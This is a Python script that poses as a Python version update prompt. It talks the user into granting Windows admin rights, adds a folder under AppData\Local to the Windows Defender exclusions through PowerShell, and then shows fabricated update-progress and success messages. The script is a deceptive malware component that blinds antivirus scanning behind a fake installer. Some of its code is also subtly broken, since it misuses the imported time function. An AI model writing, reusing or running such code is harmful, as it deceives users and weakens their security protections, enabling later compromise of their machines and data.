import os
import pathlib as pl
import random
import sys
import ctypes
from time import time

is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0

class Main:
    def __init__(self):
        pass
    
    def send_update_notification(self):
        install_input = input("A new version of Python is available: 3.12.2"+
                            "\nYou are currently using: 3.11.6"+
                            "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
        return install_input.strip().lower() in ['y', '']

    def request_admin_privileges(self):
        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) #Windows specific command to request admin privileges

    def add_folder_to_windows_defender_exclusions(self):
        folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
        os.system(command)
    
    def perform_update(self):
        steps = [
            "Checking for updates...",
            "Resolving dependencies...",
            "Downloading package metadata...",
            "Installing collected packages...",
            "Applying security patches...",
            "Finalizing installation..."
        ]

        for step in steps:
            print(step)
            time.sleep(random.uniform(0.5, 2.5)) # Simulate time taken for each step

        print("\nSuccessfully installed updates.")
        print("Current version: 3.11.6")
        print("Updated to: 3.12.2")
        print("Restart may be required.")
        time.sleep(2)
        exit(0)

if __name__ == "__main__":
    self = Main()
    if is_admin:
        self.add_folder_to_windows_defender_exclusions()
        self.perform_update()
        
    if self.send_update_notification():
        print("Updating Python...")
        time.sleep(1)
        if self.request_admin_privileges():
            print("Proceeding with update...")
            self.add_folder_to_windows_defender_exclusions()
            print("Settingup complete. Restarting installer with admin privileges...")
            self.perform_update()
        else:
            print("Admin privileges are required to perform the update. Please run the installer as an administrator.")
    else:
        print("Update skipped.")